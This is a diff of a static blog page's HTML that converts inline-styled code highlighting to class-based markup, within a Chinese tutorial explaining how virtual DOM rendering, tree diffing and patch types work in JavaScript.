-  <span style="color:#000;font-weight:bold">var</span> children <span style="color:#000;font-weight:bold">=</span> <span style="color:#000;font-weight:bold">this</span>.children <span style="color:#000;font-weight:bold">||</span> []
+  <span class="kd">var</span> <span class="nx">children</span> <span class="o">=</span> <span class="k">this</span><span class="p">.</span><span class="nx">children</span> <span class="o">||</span> <span class="p">[]</span>
 
-  children.forEach(<span style="color:#000;font-weight:bold">function</span> (child) {
-    <span style="color:#000;font-weight:bold">var</span> childEl <span style="color:#000;font-weight:bold">=</span> (child <span style="color:#000;font-weight:bold">instanceof</span> Element)
-      <span style="color:#000;font-weight:bold">?</span> child.render() <span style="color:#998;font-style:italic">// 如果子节点也是虚拟DOM，递归构建DOM节点
-</span><span style="color:#998;font-style:italic"></span>      <span style="color:#000;font-weight:bold">:</span> <span style="color:#0086b3">document</span>.createTextNode(child) <span style="color:#998;font-style:italic">// 如果字符串，只构建文本节点
-</span><span style="color:#998;font-style:italic"></span>    el.appendChild(childEl)
-  })
+  <span class="nx">children</span><span class="p">.</span><span class="nx">forEach</span><span class="p">(</span><span class="kd">function</span> <span class="p">(</span><span class="nx">child</span><span class="p">)</span> <span class="p">{</span>
+    <span class="kd">var</span> <span class="nx">childEl</span> <span class="o">=</span> <span class="p">(</span><span class="nx">child</span> <span class="k">instanceof</span> <span class="nx">Element</span><span class="p">)</span>
+      <span class="o">?</span> <span class="nx">child</span><span class="p">.</span><span class="nx">render</span><span class="p">()</span> <span class="c1">// 如果子节点也是虚拟DOM，递归构建DOM节点
+</span><span class="c1"></span>      <span class="o">:</span> <span class="nb">document</span><span class="p">.</span><span class="nx">createTextNode</span><span class="p">(</span><span class="nx">child</span><span class="p">)</span> <span class="c1">// 如果字符串，只构建文本节点
+</span><span class="c1"></span>    <span class="nx">el</span><span class="p">.</span><span class="nx">appendChild</span><span class="p">(</span><span class="nx">childEl</span><span class="p">)</span>
+  <span class="p">})</span>
 
-  <span style="color:#000;font-weight:bold">return</span> el
-}
+  <span class="k">return</span> <span class="nx">el</span>
+<span class="p">}</span>
 </code></pre></td></tr></table>
 </div>
 </div><p>render方法会根据tagName构建一个真正的DOM节点，然后设置这个节点的属性，最后递归地把自己的子节点也构建起来。所以只需要：</p>
-<div class="highlight"><div style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
-<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
 </span></code></pre></td>
-<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#000;font-weight:bold">var</span> ulRoot <span style="color:#000;font-weight:bold">=</span> ul.render()
-<span style="color:#0086b3">document</span>.body.appendChild(ulRoot)
+<td class="lntd">
+<pre class="chroma"><code class="language-js" data-lang="js"><span class="kd">var</span> <span class="nx">ulRoot</span> <span class="o">=</span> <span class="nx">ul</span><span class="p">.</span><span class="nx">render</span><span class="p">()</span>
+<span class="nb">document</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">appendChild</span><span class="p">(</span><span class="nx">ulRoot</span><span class="p">)</span>
 </code></pre></td></tr></table>
 </div>
 </div><p>上面的ulRoot是真正的DOM节点，把它塞入文档中，这样body里面就有了真正的ul的DOM结构：</p>
-<div class="highlight"><div style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
-<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
 </span></code></pre></td>
-<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#000;font-weight:bold">&lt;</span>ul id<span style="color:#000;font-weight:bold">=</span><span style="color:#d14">&#39;list&#39;</span><span style="color:#000;font-weight:bold">&gt;</span>
-  <span style="color:#000;font-weight:bold">&lt;</span>li <span style="color:#000;font-weight:bold">class</span><span style="color:#000;font-weight:bold">=</span><span style="color:#d14">&#39;item&#39;</span><span style="color:#000;font-weight:bold">&gt;</span>Item <span style="color:#099">1</span><span style="color:#000;font-weight:bold">&lt;</span><span style="color:#a61717;background-color:#e3d2d2">/li&gt;</span>
-  <span style="color:#000;font-weight:bold">&lt;</span>li <span style="color:#000;font-weight:bold">class</span><span style="color:#000;font-weight:bold">=</span><span style="color:#d14">&#39;item&#39;</span><span style="color:#000;font-weight:bold">&gt;</span>Item <span style="color:#099">2</span><span style="color:#000;font-weight:bold">&lt;</span><span style="color:#a61717;background-color:#e3d2d2">/li&gt;</span>
-  <span style="color:#000;font-weight:bold">&lt;</span>li <span style="color:#000;font-weight:bold">class</span><span style="color:#000;font-weight:bold">=</span><span style="color:#d14">&#39;item&#39;</span><span style="color:#000;font-weight:bold">&gt;</span>Item <span style="color:#099">3</span><span style="color:#000;font-weight:bold">&lt;</span><span style="color:#a61717;background-color:#e3d2d2">/li&gt;</span>
-<span style="color:#000;font-weight:bold">&lt;</span><span style="color:#a61717;background-color:#e3d2d2">/ul&gt;</span>
+<td class="lntd">
+<pre class="chroma"><code class="language-js" data-lang="js"><span class="o">&lt;</span><span class="nx">ul</span> <span class="nx">id</span><span class="o">=</span><span class="s1">&#39;list&#39;</span><span class="o">&gt;</span>
+  <span class="o">&lt;</span><span class="nx">li</span> <span class="kr">class</span><span class="o">=</span><span class="s1">&#39;item&#39;</span><span class="o">&gt;</span><span class="nx">Item</span> <span class="mi">1</span><span class="o">&lt;</span><span class="err">/li&gt;</span>
+  <span class="o">&lt;</span><span class="nx">li</span> <span class="kr">class</span><span class="o">=</span><span class="s1">&#39;item&#39;</span><span class="o">&gt;</span><span class="nx">Item</span> <span class="mi">2</span><span class="o">&lt;</span><span class="err">/li&gt;</span>
+  <span class="o">&lt;</span><span class="nx">li</span> <span class="kr">class</span><span class="o">=</span><span class="s1">&#39;item&#39;</span><span class="o">&gt;</span><span class="nx">Item</span> <span class="mi">3</span><span class="o">&lt;</span><span class="err">/li&gt;</span>
+<span class="o">&lt;</span><span class="err">/ul&gt;</span>
 </code></pre></td></tr></table>
 </div>
 </div><h4 id="32-步骤二比较两棵虚拟dom树的差异">3.2 步骤二：比较两棵虚拟DOM树的差异</h4>
@@ -1564,79 +1696,79 @@ Element.prototype.render <span style="color:#000;font-weight:bold">=</span> <spa
 <p>在实际的代码中，会对新旧两棵树进行一个深度优先的遍历，这样每个节点都会有一个唯一的标记：</p>
 <p><img src="https://pic2.zhimg.com/50/c4ba535164d29fd46383d19512c37349_hd.png" alt="image"></p>
 <p>在深度优先遍历的时候，每遍历到一个节点就把该节点和新的的树进行对比。如果有差异的话就记录到一个对象里面。</p>
-<div class="highlight"><div style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
-<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
 </span></code></pre></td>
-<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js">
-<span style="color:#998;font-style:italic">// diff 函数，对比两棵树
-</span><span style="color:#998;font-style:italic"></span><span style="color:#000;font-weight:bold">function</span> diff (oldTree, newTree) {
-  <span style="color:#000;font-weight:bold">var</span> index <span style="color:#000;font-weight:bold">=</span> <span style="color:#099">0</span> <span style="color:#998;font-style:italic">// 当前节点的标志
-</span><span style="color:#998;font-style:italic"></span>  <span style="color:#000;font-weight:bold">var</span> patches <span style="color:#000;font-weight:bold">=</span> {} <span style="color:#998;font-style:italic">// 用来记录每个节点差异的对象
-</span><span style="color:#998;font-style:italic"></span>  dfsWalk(oldTree, newTree, index, patches)
-  <span style="color:#000;font-weight:bold">return</span> patches
-}
+<td class="lntd">
+<pre class="chroma"><code class="language-js" data-lang="js">
+<span class="c1">// diff 函数，对比两棵树
+</span><span class="c1"></span><span class="kd">function</span> <span class="nx">diff</span> <span class="p">(</span><span class="nx">oldTree</span><span class="p">,</span> <span class="nx">newTree</span><span class="p">)</span> <span class="p">{</span>
+  <span class="kd">var</span> <span class="nx">index</span> <span class="o">=</span> <span class="mi">0</span> <span class="c1">// 当前节点的标志
+</span><span class="c1"></span>  <span class="kd">var</span> <span class="nx">patches</span> <span class="o">=</span> <span class="p">{}</span> <span class="c1">// 用来记录每个节点差异的对象
+</span><span class="c1"></span>  <span class="nx">dfsWalk</span><span class="p">(</span><span class="nx">oldTree</span><span class="p">,</span> <span class="nx">newTree</span><span class="p">,</span> <span class="nx">index</span><span class="p">,</span> <span class="nx">patches</span><span class="p">)</span>
+  <span class="k">return</span> <span class="nx">patches</span>
+<span class="p">}</span>
 
-<span style="color:#998;font-style:italic">// 对两棵树进行深度优先遍历
-</span><span style="color:#998;font-style:italic"></span><span style="color:#000;font-weight:bold">function</span> dfsWalk (oldNode, newNode, index, patches) {
-  <span style="color:#998;font-style:italic">// 对比oldNode和newNode的不同，记录下来
-</span><span style="color:#998;font-style:italic"></span>  patches[index] <span style="color:#000;font-weight:bold">=</span> [...]
+<span class="c1">// 对两棵树进行深度优先遍历
+</span><span class="c1"></span><span class="kd">function</span> <span class="nx">dfsWalk</span> <span class="p">(</span><span class="nx">oldNode</span><span class="p">,</span> <span class="nx">newNode</span><span class="p">,</span> <span class="nx">index</span><span class="p">,</span> <span class="nx">patches</span><span class="p">)</span> <span class="p">{</span>
+  <span class="c1">// 对比oldNode和newNode的不同，记录下来
+</span><span class="c1"></span>  <span class="nx">patches</span><span class="p">[</span><span class="nx">index</span><span class="p">]</span> <span class="o">=</span> <span class="p">[...]</span>
 
-  diffChildren(oldNode.children, newNode.children, index, patches)
-}
+  <span class="nx">diffChildren</span><span class="p">(</span><span class="nx">oldNode</span><span class="p">.</span><span class="nx">children</span><span class="p">,</span> <span class="nx">newNode</span><span class="p">.</span><span class="nx">children</span><span class="p">,</span> <span class="nx">index</span><span class="p">,</span> <span class="nx">patches</span><span class="p">)</span>
+<span class="p">}</span>
 
-<span style="color:#998;font-style:italic">// 遍历子节点
-</span><span style="color:#998;font-style:italic"></span><span style="color:#000;font-weight:bold">function</span> diffChildren (oldChildren, newChildren, index, patches) {
-  <span style="color:#000;font-weight:bold">var</span> leftNode <span style="color:#000;font-weight:bold">=</span> <span style="color:#000;font-weight:bold">null</span>
-  <span style="color:#000;font-weight:bold">var</span> currentNodeIndex <span style="color:#000;font-weight:bold">=</span> index
-  oldChildren.forEach(<span style="color:#000;font-weight:bold">function</span> (child, i) {
-    <span style="color:#000;font-weight:bold">var</span> newChild <span style="color:#000;font-weight:bold">=</span> newChildren[i]
-    currentNodeIndex <span style="color:#000;font-weight:bold">=</span> (leftNode <span style="color:#000;font-weight:bold">&amp;&amp;</span> leftNode.count) <span style="color:#998;font-style:italic">// 计算节点的标识
-</span><span style="color:#998;font-style:italic"></span>      <span style="color:#000;font-weight:bold">?</span> currentNodeIndex <span style="color:#000;font-weight:bold">+</span> leftNode.count <span style="color:#000;font-weight:bold">+</span> <span style="color:#099">1</span>
-      <span style="color:#000;font-weight:bold">:</span> currentNodeIndex <span style="color:#000;font-weight:bold">+</span> <span style="color:#099">1</span>
-    dfsWalk(child, newChild, currentNodeIndex, patches) <span style="color:#998;font-style:italic">// 深度遍历子节点
-</span><span style="color:#998;font-style:italic"></span>    leftNode <span style="color:#000;font-weight:bold">=</span> child
-  })
-}
+<span class="c1">// 遍历子节点
+</span><span class="c1"></span><span class="kd">function</span> <span class="nx">diffChildren</span> <span class="p">(</span><span class="nx">oldChildren</span><span class="p">,</span> <span class="nx">newChildren</span><span class="p">,</span> <span class="nx">index</span><span class="p">,</span> <span class="nx">patches</span><span class="p">)</span> <span class="p">{</span>
+  <span class="kd">var</span> <span class="nx">leftNode</span> <span class="o">=</span> <span class="kc">null</span>
+  <span class="kd">var</span> <span class="nx">currentNodeIndex</span> <span class="o">=</span> <span class="nx">index</span>
+  <span class="nx">oldChildren</span><span class="p">.</span><span class="nx">forEach</span><span class="p">(</span><span class="kd">function</span> <span class="p">(</span><span class="nx">child</span><span class="p">,</span> <span class="nx">i</span><span class="p">)</span> <span class="p">{</span>
+    <span class="kd">var</span> <span class="nx">newChild</span> <span class="o">=</span> <span class="nx">newChildren</span><span class="p">[</span><span class="nx">i</span><span class="p">]</span>
+    <span class="nx">currentNodeIndex</span> <span class="o">=</span> <span class="p">(</span><span class="nx">leftNode</span> <span class="o">&amp;&amp;</span> <span class="nx">leftNode</span><span class="p">.</span><span class="nx">count</span><span class="p">)</span> <span class="c1">// 计算节点的标识
+</span><span class="c1"></span>      <span class="o">?</span> <span class="nx">currentNodeIndex</span> <span class="o">+</span> <span class="nx">leftNode</span><span class="p">.</span><span class="nx">count</span> <span class="o">+</span> <span class="mi">1</span>
+      <span class="o">:</span> <span class="nx">currentNodeIndex</span> <span class="o">+</span> <span class="mi">1</span>
+    <span class="nx">dfsWalk</span><span class="p">(</span><span class="nx">child</span><span class="p">,</span> <span class="nx">newChild</span><span class="p">,</span> <span class="nx">currentNodeIndex</span><span class="p">,</span> <span class="nx">patches</span><span class="p">)</span> <span class="c1">// 深度遍历子节点
+</span><span class="c1"></span>    <span class="nx">leftNode</span> <span class="o">=</span> <span class="nx">child</span>
+  <span class="p">})</span>
+<span class="p">}</span>
 </code></pre></td></tr></table>
 </div>
 </div><p>例如，上面的div和新的div有差异，当前的标记是0，那么：</p>
-<div class="highlight"><div style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
-<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
-<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js">patches[<span style="color:#099">0</span>] <span style="color:#000;font-weight:bold">=</span> [{difference}, {difference}, ...] <span style="color:#998;font-style:italic">// 用数组存储新旧节点的不同
+<td class="lntd">
+<pre class="chroma"><code class="language-js" data-lang="js"><span class="nx">patches</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="p">[{</span><span class="nx">difference</span><span class="p">},</span> <span class="p">{</span><span class="nx">difference</span><span class="p">},</span> <span class="p">...]</span> <span class="c1">// 用数组存储新旧节点的不同
 </span></code></pre></td></tr></table>
 </div>
 </div><h5 id="322-差异类型">3.2.2 差异类型</h5>
@@ -1648,33 +1780,33 @@ Element.prototype.render <span style="color:#000;font-weight:bold">=</span> <spa
 <li>对于文本节点，文本内容可能会改变。例如修改上面的文本节点2内容为Virtual DOM 2。</li>
 </ol>
 <p>所以我们定义了几种差异类型：</p>
-<div class="highlight"><div style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
-<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
 </span></code></pre></td>
-<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#000;font-weight:bold">var</span> REPLACE <span style="color:#000;font-weight:bold">=</span> <span style="color:#099">0</span>
-<span style="color:#000;font-weight:bold">var</span> REORDER <span style="color:#000;font-weight:bold">=</span> <span style="color:#099">1</span>
-<span style="color:#000;font-weight:bold">var</span> PROPS <span style="color:#000;font-weight:bold">=</span> <span style="color:#099">2</span>
-<span style="color:#000;font-weight:bold">var</span> TEXT <span style="color:#000;font-weight:bold">=</span> <span style="color:#099">3</span>
+<td class="lntd">
+<pre class="chroma"><code class="language-js" data-lang="js"><span class="kd">var</span> <span class="nx">REPLACE</span> <span class="o">=</span> <span class="mi">0</span>
+<span class="kd">var</span> <span class="nx">REORDER</span> <span class="o">=</span> <span class="mi">1</span>
+<span class="kd">var</span> <span class="nx">PROPS</span> <span class="o">=</span> <span class="mi">2</span>
+<span class="kd">var</span> <span class="nx">TEXT</span> <span class="o">=</span> <span class="mi">3</span>
 </code></pre></td></tr></table>
 </div>
 </div><p>对于节点替换，很简单。判断新旧节点的tagName和是不是一样的，如果不一样的说明需要替换掉。如div换成section，就记录下：</p>
-<div class="highlight"><div style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
-<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
 </span></code></pre></td>
-<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js">patches[<span style="color:#099">0</span>] <span style="color:#000;font-weight:bold">=</span> [{
-  type<span style="color:#000;font-weight:bold">:</span> REPALCE,
-  node<span style="color:#000;font-weight:bold">:</span> newNode <span style="color:#998;font-style:italic">// el(&#39;section&#39;, props, children)
-</span><span style="color:#998;font-style:italic"></span>}]
+<td class="lntd">
+<pre class="chroma"><code class="language-js" data-lang="js"><span class="nx">patches</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="p">[{</span>
+  <span class="nx">type</span><span class="o">:</span> <span class="nx">REPALCE</span><span class="p">,</span>
+  <span class="nx">node</span><span class="o">:</span> <span class="nx">newNode</span> <span class="c1">// el(&#39;section&#39;, props, children)
+</span><span class="c1"></span><span class="p">}]</span>
 </code></pre></td></tr></table>
 </div>
 </div>
@@ -1877,12 +2009,6 @@ Element.prototype.render <span style="color:#000;font-weight:bold">=</span> <spa
 
 
 
-
-  
-    <script type="text/javascript" src="/js/load-photoswipe.js"></script>
-    <script type="text/javascript" src="/lib/photoswipe/photoswipe.min.js"></script>
-    <script type="text/javascript" src="/lib/photoswipe/photoswipe-ui-default.min.js"></script>
-  
 
 
 
